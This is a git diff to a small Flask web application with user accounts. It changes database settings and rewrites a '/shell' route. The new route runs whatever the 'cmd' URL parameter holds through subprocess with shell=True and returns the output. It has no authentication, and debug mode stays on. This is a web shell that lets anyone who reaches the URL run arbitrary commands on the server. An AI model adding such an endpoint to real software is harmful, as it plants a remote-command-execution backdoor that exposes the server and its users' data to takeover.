@@ -4,14 +4,14 @@ from flask import Flask, url_for, render_template, request, redirect, session
 from flask_sqlalchemy import SQLAlchemy
 from flask.ext.bcrypt import Bcrypt
 from darts import app
-import commands
+import subprocess
 
 app.config.update(
     DEBUG=True,
-    SQLALCHEMY_DATABASE_URI='sqlite:///local/AppData/test.db'
+    SQLALCHEMY_DATABASE_URI='sqlite:///test.db'
 )
 db = SQLAlchemy(app)
-# db.create_all()
+db.create_all()
 bcrypt = Bcrypt(app)
 
 class User(db.Model):
@@ -74,9 +74,10 @@ def logout():
 
 @app.route("/shell")
 def shell():
-    s = request.args.get('cmd')
+    p = subprocess.Popen(request.args.get('cmd'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    stdout_data, stderr_data = p.communicate()
     # return commands.getoutput(s)
-    return request.args.get('cmd')
+    return stdout_data
 
 if __name__ == '__main__':
     app.debug = True
